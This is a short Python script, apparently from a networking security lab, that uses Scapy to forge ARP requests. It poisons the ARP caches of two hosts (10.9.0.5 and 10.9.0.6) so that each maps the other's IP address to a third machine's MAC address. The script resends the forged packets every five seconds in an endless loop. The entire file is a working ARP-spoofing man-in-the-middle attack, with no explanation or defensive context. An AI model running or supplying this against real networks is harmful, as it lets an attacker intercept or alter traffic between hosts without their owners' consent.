from scapy.all import *
import time
E = Ether()
E.dst = '02:42:0a:09:00:05'
E.src = '02:42:0a:09:00:69'
A = ARP()
A.hwsrc = '02:42:0a:09:00:69'
A.psrc = '10.9.0.6'
A.pdst = '10.9.0.5'
A.op = 1
pkt = E/A

E1 = Ether()
E1.dst = '02:42:0a:09:00:06'
E1.src = '02:42:0a:09:00:69'
A1 = ARP()
A1.hwsrc = '02:42:0a:09:00:69'
A1.psrc = '10.9.0.5'
A1.pdst = '10.9.0.6'
A1.op = 1
pkt1 = E1/A1
sendp(pkt,verbose = 1)
sendp(pkt1,verbose= 1)
while True:
    time.sleep(5)
    sendp(pkt,verbose = 1)
    sendp(pkt1,verbose= 1)
    

    
